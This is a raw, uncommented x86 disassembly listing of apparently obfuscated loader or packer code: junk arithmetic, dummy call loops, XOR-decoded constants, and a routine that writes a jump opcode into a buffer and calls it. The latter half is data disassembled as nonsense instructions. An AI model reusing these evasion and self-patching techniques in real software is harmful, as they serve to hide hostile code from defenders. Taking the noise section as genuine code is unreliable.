  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    edi,ecx
  4058ef:	pop    edx
  4058f0:	ror    ebp,0x34
  4058f3:	pop    edi
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	mov    al,0xe1
  4058fc:	dec    edi
  4058fd:	jne    0x40595f
  4058ff:	or     al,0x3c
  405901:	xor    esp,DWORD PTR [eax+0x17]
  405904:	add    DWORD PTR [ebx-0x6ef6d6e0],eax
  40590a:	stos   BYTE PTR es:[edi],al
  40590b:	pop    esi
  40590c:	dec    edx
  40590d:	repnz mov BYTE PTR [ecx-0x90f3f40],dh
  405914:	jmp    0x5ac70ad2
  405919:	imul   esi,DWORD PTR [edx-0x31f8f7fd],0xfffffff8
  405920:	mov    ecx,edx
  405922:	sbb    ecx,DWORD PTR [edx]
  405924:	aad    0xb2
  405926:	xchg   ebx,eax
  405927:	retf   
  405928:	aaa    
  405929:	xchg   edx,eax
  40592a:	cwde   
  40592b:	mov    es,WORD PTR [edx-0x306f809f]
  405931:	jmp    0x934fef6e
  405936:	jns    0x4058e9
  405938:	sbb    al,0x3
  40593a:	jae    0x4058d1
  40593c:	out    0xc7,eax
  40593e:	xchg   BYTE PTR [edi],bl
  405940:	fcom   DWORD PTR [edi-0x731dafed]
  405946:	aam    0x9
  405948:	and    BYTE PTR [edx+0x5e],bl
  40594b:	xchg   ebp,eax
  40594c:	push   ebp
  40594d:	popf   
  40594e:	jmp    0xa7b01c0a
  405953:	std    
  405954:	mov    ebx,0x3bb826c4
  405959:	rol    DWORD PTR [edx-0x6e],0xc9
  40595d:	shl    DWORD PTR [esi+0x563aa34e],1
  405963:	scas   al,BYTE PTR es:[edi]
  405964:	or     DWORD PTR [edi+eiz*2],esp
  405967:	pop    ebp
  405968:	(bad)  
  405969:	xor    ebp,ecx
  40596b:	xor    eax,0x292a5758
  405970:	push   eax
  405971:	mov    bh,0x3a
  405973:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405974:	add    al,0x93
  405976:	jp     0x4059dd
  405978:	inc    eax
  405979:	cmp    DWORD PTR [ecx+0x150bbddf],eax
  40597f:	adc    ebx,eax
  405981:	mov    ebp,0xd2351a1b
  405986:	dec    esp
  405987:	pop    esi
  405988:	imul   esp,DWORD PTR [ebp-0x2a7480b2],0x88cb5654
  405992:	pop    ebx
  405993:	ins    BYTE PTR es:[edi],dx
  405994:	test   eax,0xc66141a8
  405999:	sahf   
  40599a:	int3   
  40599b:	mov    ebx,0x52b1b612
  4059a0:	(bad)  
  4059a1:	fwait
  4059a2:	outs   dx,BYTE PTR ds:[esi]
  4059a3:	xor    ebp,edi
  4059a5:	push   eax
  4059a6:	inc    ebx
  4059a7:	xor    al,0x97
  4059a9:	xchg   edi,eax
  4059aa:	mov    dh,0x3f
  4059ac:	push   ds
  4059ad:	retf   
  4059ae:	xor    ch,bl
  4059b0:	pop    edi
  4059b1:	or     dl,BYTE PTR [ebp+0x22035af7]
  4059b7:	sub    cl,BYTE PTR [ebx+0x7b951615]
  4059bd:	ins    BYTE PTR es:[edi],dx
  4059be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059c0:	mov    edx,0x406a270a
  4059c5:	mov    bl,0xe0
  4059c7:	repnz iret 
  4059c9:	jbe    0x405980
  4059cb:	jns    0x4059d0
  4059cd:	fwait
  4059ce:	jecxz  0x4059bd
  4059d0:	fwait
  4059d1:	leave  
  4059d2:	inc    esp
  4059d3:	sbb    ebp,DWORD PTR [edx+ebx*2]
  4059d6:	jmp    0x405a17
  4059d8:	push   ecx
  4059d9:	in     al,dx
  4059da:	mov    esp,0x5a78e75c
  4059df:	mov    es,WORD PTR [ebp+0x78]
  4059e2:	daa    
  4059e3:	xchg   ebx,eax
  4059e4:	push   cs
  4059e5:	jns    0x405a1d
  4059e7:	and    eax,0x402431aa
  4059ec:	aad    0x5c
  4059ee:	cs mov bh,0x7e
  4059f1:	fist   DWORD PTR [esi+ebp*8+0x45]
  4059f5:	enter  0xfcc2,0x97
  4059f9:	xor    eax,0xffffff8d
  4059fc:	mov    WORD PTR [ecx+0x75],fs
  4059ff:	jg     0x40599f
  405a01:	inc    ebx
  405a02:	add    al,0x1d
  405a04:	xor    BYTE PTR [ebx],al
  405a06:	cmp    eax,0x8e6ae2
  405a0b:	push   cs
  405a0c:	inc    ebp
  405a0d:	mov    fs,edx
  405a0f:	je     0x4059cc
  405a11:	aam    0xdb
  405a13:	leave  
  405a14:	arpl   WORD PTR [ecx],ax
  405a16:	out    0xa0,eax
  405a18:	aaa    
  405a19:	(bad)  
  405a1b:	addr16 pusha 
  405a1d:	fadd   QWORD PTR [eax+0x508ac192]
  405a23:	cdq    
  405a24:	mov    ebx,0x779eba92
  405a29:	(bad)  
  405a2a:	mov    esp,0x8f15cfb5
  405a2f:	jge    0x4059e9
  405a31:	pop    esi
  405a32:	mov    BYTE PTR [edx-0xb662adf],cl
  405a38:	in     al,dx
  405a39:	jp     0x405a37
  405a3b:	xlat   BYTE PTR ds:[ebx]
  405a3c:	add    eax,0xfd84621a
  405a41:	xor    eax,0x4f5fa3f2
  405a46:	dec    edi
  405a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a48:	imul   edx,eax,0xe1098e5e
  405a4e:	adc    eax,0xe782d2da
  405a53:	data16 das 
  405a55:	mov    bl,0xe0
  405a57:	retf   
  405a58:	dec    ebp
  405a59:	neg    BYTE PTR [ebx+0x7d3a20d7]
  405a5f:	cmp    DWORD PTR [ebx],ebx
  405a61:	in     al,dx
  405a62:	mov    esp,0xab9db9d
  405a67:	jmp    0xfdbd:0xafd06129
  405a6e:	and    eax,0xa0bc15de
  405a73:	arpl   WORD PTR [esi],bp
  405a75:	xor    DWORD PTR [ebx-0x2839d174],esi
  405a7b:	(bad)  
  405a7c:	push   ebp
  405a7d:	shr    eax,1
  405a7f:	mov    al,0x9d
  405a81:	ja     0x405a7c
  405a83:	sub    al,0xd5
  405a85:	ss pop esp
  405a87:	out    dx,eax
  405a88:	les    edi,FWORD PTR [ebp+0x30]
  405a8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a8c:	and    dl,BYTE PTR [edx-0x7f]
  405a8f:	repz and BYTE PTR [eax+0x4515216d],al
  405a96:	enter  0x600f,0x5e
  405a9a:	inc    esp
  405a9b:	pop    esi
  405a9c:	xchg   ebx,eax
  405a9d:	push   ecx
  405a9e:	jg     0x405a27
  405aa0:	aas    
  405aa1:	stos   BYTE PTR es:[edi],al
  405aa2:	(bad)  
  405aa3:	sub    ch,BYTE PTR [ebx]
  405aa5:	dec    edi
  405aa6:	sub    esp,DWORD PTR [edx-0x32]
  405aa9:	and    al,0x80
  405aab:	imul   BYTE PTR [edx+esi*8-0x1c3b0e36]
  405ab2:	jmp    0x97c441f4
  405ab7:	sub    DWORD PTR [esi-0x1b],0x7
  405abb:	bound  ebx,QWORD PTR [ebx+0x29]
  405abe:	jns    0x405b2a
  405ac0:	idiv   DWORD PTR ds:0x6cf4ef43
  405ac6:	pop    eax
  405ac7:	push   ecx
  405ac8:	dec    ebx
  405ac9:	adc    al,0x48
  405acb:	push   edi
  405acc:	sbb    BYTE PTR [edi],bh
  405ace:	adc    BYTE PTR [ebx-0x4029a030],al
  405ad4:	mov    ebp,0x10c4f321
  405ad9:	test   al,0x78
  405adb:	mov    dl,0x98
  405add:	xor    eax,0x4199e653
  405ae2:	ror    ch,0x4d
  405ae5:	mov    ch,BYTE PTR ds:[ebx+eax*8+0x7f6168c9]
  405aed:	cmp    edi,eax
  405aef:	jle    0x405b01
  405af1:	jbe    0x405b1e
  405af3:	mov    ds:0xcabcabd,eax
  405af8:	sub    eax,0x652b1cf4
  405afd:	clc    
  405afe:	push   esi
  405aff:	gs sub eax,0xa706dffb
  405b05:	cld    
  405b06:	pop    ecx
  405b07:	les    esi,FWORD PTR [ecx]
  405b09:	les    ecx,FWORD PTR [esi+ebp*2+0x2d]
  405b0d:	scas   eax,DWORD PTR es:[edi]
  405b0e:	gs cmc 
  405b10:	xor    DWORD PTR [ebp+0x5a],edi
  405b13:	or     BYTE PTR [esp+ebx*4+0x6a],ch
  405b17:	mov    al,ds:0x687d2e9c
  405b1c:	shl    DWORD PTR ss:[ebx-0x7f],0xdf
  405b21:	idiv   BYTE PTR [esi+0x6a1af411]
  405b27:	xor    DWORD PTR [edi],esp
  405b29:	mov    esp,0x916babc8
  405b2e:	mov    ebx,0x4d946e94
  405b33:	cmp    ebp,DWORD PTR [ecx+0xbc00028]
  405b39:	or     eax,0x5ba49bc7
  405b3e:	pop    ds
  405b3f:	inc    edx
  405b40:	lods   eax,DWORD PTR ds:[esi]
  405b41:	lods   eax,DWORD PTR ds:[esi]
  405b42:	loopne 0x405add
  405b44:	push   0x1320d467
  405b49:	sbb    dl,dh
  405b4b:	or     al,0x29
  405b4d:	repz add edx,eax
  405b50:	pushf  
  405b51:	xor    eax,0x93b6a1cd
  405b56:	cmp    eax,DWORD PTR [eax-0x780843d8]
  405b5c:	cmp    dh,bh
  405b5e:	scas   al,BYTE PTR es:[edi]
  405b5f:	xchg   ecx,eax
  405b60:	push   esi
  405b61:	cmc    
  405b62:	inc    ebx
  405b63:	inc    edi
  405b64:	jl     0x405b84
  405b66:	in     eax,0x7e
  405b68:	pop    ecx
  405b69:	mov    ah,BYTE PTR [ebx+eax*1-0x1]
  405b6d:	jns    0x405b4e
  405b6f:	loope  0x405bba
  405b71:	push   0xffffff94
  405b73:	fimul  WORD PTR [edx]
  405b75:	ficomp WORD PTR [ebx]
  405b77:	hlt    
  405b78:	inc    esi
  405b79:	push   edi
  405b7a:	lods   al,BYTE PTR ds:[esi]
  405b7b:	mov    ch,0xaa
  405b7d:	mov    bl,0x23
  405b7f:	xor    al,0xca
  405b81:	(bad)  
  405b82:	jne    0x405b9b
  405b84:	cmp    eax,0x5ca25ee6
  405b89:	sbb    eax,0xb1c16ce7
  405b8e:	push   0x77b3683b
  405b93:	jl     0x405bf9
